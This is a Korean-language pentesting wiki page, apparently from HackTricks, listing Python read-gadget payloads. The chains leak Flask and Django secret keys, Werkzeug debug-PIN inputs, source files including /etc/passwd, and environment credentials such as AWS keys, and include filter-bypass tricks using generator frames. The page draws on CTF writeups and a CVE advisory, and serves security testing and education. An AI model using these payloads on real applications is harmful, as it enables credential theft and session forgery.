# Python 내부 읽기 Gadgets

## 기본 정보

[**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) 또는 [**Class Pollution**](class-pollution-pythons-prototype-pollution.md)과 같은 다양한 취약점을 통해 **Python 내부 데이터를 읽을 수 있지만 코드를 실행할 수는 없을 수 있습니다**. 따라서 pentester는 이러한 읽기 권한을 최대한 활용하여 **민감한 권한을 획득하고 취약점을 escalation해야 합니다**.

### Flask - secret key 읽기

Flask 애플리케이션의 메인 페이지에는 이 **secret이 구성된** **`app`** 전역 객체가 있을 가능성이 높습니다.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
이 경우 [**Bypass Python sandboxes page**](bypass-python-sandboxes/index.html)의 **access global objects**용 gadget을 사용하기만 하면 이 object에 access할 수 있습니다.

**vulnerability가 다른 python file에 있는 경우**, 파일을 traverse하여 main file에 도달한 뒤 **global object `app.secret_key`에 access**할 수 있는 gadget이 필요하며, 이 key를 알고 [**escalate privileges**](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign)할 수 있습니다.

다음과 같은 payload를 사용할 수 있습니다 [이 writeup에서 가져옴](https://ctftime.org/writeup/36082):<sup>[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
이 payload를 사용해 **`app.secret_key`를 읽을 수 있습니다**. 원래 버그가 write primitive도 제공하는 경우(예: class pollution), 동일한 경로를 사용해 해당 키를 교체하고 더 높은 권한의 Flask cookies에 서명할 수 있습니다.

### Werkzeug - machine_id 및 node uuid

[**이 writeup의 payload 사용**](https://vozec.fr/writeups/tweedle-dum-dee/)을 통해 **machine_id**와 **uuid** node에 접근할 수 있습니다. 이는 [**Werkzeug pin을 생성**](../../network-services-pentesting/pentesting-web/werkzeug.md)하고 **debug mode가 활성화된 경우** `/console`의 Python console에 접근하는 데 필요한 **private bits**입니다:<sup>[[4]](#references)</sup>
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> **error**를 발생시키는 방식으로 웹 페이지에서 **서버의 `app.py` 로컬 경로**를 확인할 수 있으며, 이 **경로가 노출**됩니다.

취약점이 다른 Python 파일에 있다면, 메인 Python 파일의 객체에 접근하기 위해 앞서 설명한 Flask 트릭을 확인하세요.

### Django - SECRET_KEY 및 settings module

애플리케이션이 시작되면 Django settings 객체는 `sys.modules`에 캐시됩니다. 읽기 primitive만으로도 **`SECRET_KEY`**, fallback keys, database credentials 또는 signing salts를 leak할 수 있습니다:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
취약한 gadget이 다른 모듈에 있다면, 먼저 globals를 순회합니다:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS`는 현재 `SECRET_KEY`만큼이나 중요합니다. rotation 중에도 이전에 서명된 값을 여전히 검증하기 때문입니다.<sup>[[1]](#references)</sup> 또한 `SESSION_ENGINE`과 `SESSION_SERIALIZER`를 leak하면 영향이 cookie forgery에만 국한되는지, 아니면 더 강력한 것인지 빠르게 판단할 수 있습니다. 웹 영향에 대한 자세한 내용은 [**Django pentesting 페이지**](../../network-services-pentesting/pentesting-web/django.md)를 확인하세요.

### Module loader gadgets - 소스 코드와 파일 읽기

로드된 Python 모듈은 일반적으로 `__loader__`를 유지합니다. 파일 기반 loader는 `get_source()`와 `get_data()`를 자주 노출하는데, 이미 모듈 객체에 접근할 수 있지만 `open()`에는 접근할 수 없는 경우 완벽한 **read-only primitives**로 사용할 수 있습니다:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
이는 **config modules, blueprints, helper files 또는 hidden routes**를 dump하고 API keys, DSNs, flag paths 또는 추가 gadget entry points를 복구하는 데 매우 유용합니다.

subclass enumeration만 가능한 경우, index를 hard-coding하는 대신 이름으로 loader를 검색하세요:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### 제너레이터 / 코루틴 프레임 전역 변수

제너레이터/코루틴 object를 생성하거나 접근할 수 있다면, 어떤 함수 `__globals__` gadget도 필요 없이 해당 프레임에서 전역 변수를 leak할 수 있습니다. 이는 `gi_frame`, `ag_frame`, `cr_frame` 또는 `f_globals`와 같은 프레임 attribute를 잊고 dunder 이름만 차단하는 필터를 대상으로 할 때 유용합니다:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
프레임 전역 변수를 확보한 후에는 다른 gadget과 동일하게 계속 진행합니다(`sys.modules`, settings objects, `os.environ` 등). 최근 sandbox escape는 `gi_frame`과 `f_globals`가 dunder attribute가 아니며 단순한 deny-list를 우회해 살아남는 경우가 많기 때문에 이 방법을 계속 재발견하고 있습니다.

### 로드된 모듈을 통한 환경 변수 / cloud credentials

많은 jail은 여전히 어딘가에서 `os` 또는 `sys`를 import합니다. 접근 가능한 함수의 `__init__.__globals__`를 악용하여 이미 import된 `os` 모듈로 pivot한 다음, API token, cloud key 또는 flag가 포함된 **환경 변수**를 덤프할 수 있습니다:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
하위 클래스 인덱스가 필터링된 경우 loaders를 사용합니다:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Environment variables는 read에서 full compromise로 이동하는 데 필요한 유일한 secrets인 경우가 많습니다(cloud IAM keys, database URLs, signing keys 등).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), affected versions `<0.61.0`)은 crafted component requests를 통해 **class pollution**을 허용했습니다. `__init__.__globals__`와 같은 property path는 component-module globals 및 imported modules에 도달할 수 있었으며, advisory에서는 read-only exploit이 아니라 Django의 `SECRET_KEY`와 `os.environ`의 값을 덮어쓰는 방법을 보여 줍니다.<sup>[[5]](#references)</sup> 별도의 bug를 통해 동일한 object graph에 read access가 제공된다면, code execution 없이도 해당 globals에서 configuration과 credentials가 노출될 수 있습니다.

### Gadget collections for chaining

최근 CTF와 pyjail research에서는 attribute access와 subclass enumeration만으로 구축된 신뢰할 수 있는 read chains가 확인되었습니다. [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker)와 같은 community-maintained lists는 objects에서 `__globals__`, `sys.modules`, 그리고 최종적으로 sensitive data까지 traverse하기 위해 조합할 수 있는 수백 개의 minimal gadgets를 정리합니다.<sup>[[2]](#references)</sup> raw subclass indexes보다는 **attribute/name based searches**를 우선 사용하세요. `os._wrap_close`, `FileLoader`, `warnings.catch_warnings` 등의 위치는 Python versions와 추가로 imported libraries에 따라 달라지기 때문입니다.

## References

- [1] [Django cryptographic signing 문서](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / task manager / Writeup](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – FCSC 2023 writeup](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Django-Unicorn Class Pollution Vulnerability, RCE, XSS, DoS 및 Authentication Bypass로 이어지는 취약점 (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)
{{#include ../../banners/hacktricks-training.md}}
